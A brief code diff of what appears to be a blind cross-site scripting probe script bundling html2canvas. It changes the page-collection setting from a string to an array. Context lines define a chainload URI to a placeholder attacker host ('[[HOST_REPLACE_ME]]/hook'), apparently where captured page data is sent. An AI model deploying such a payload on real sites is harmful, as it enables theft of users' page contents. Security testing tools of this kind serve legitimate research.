@@ -7,7 +7,7 @@ r.forEach(function(e){try{n.style[e]=t.css(e)}catch(r){E("html2canvas: Parse: Ex
 //TODO: url - configurable in UI settings
 
 var chainload_uri = "[[HOST_REPLACE_ME]]/hook";
-var collect_page_list = "/"
+var collect_page_list = ["/"]
 
 function never_null( value ) {
     if( value !== undefined ) {
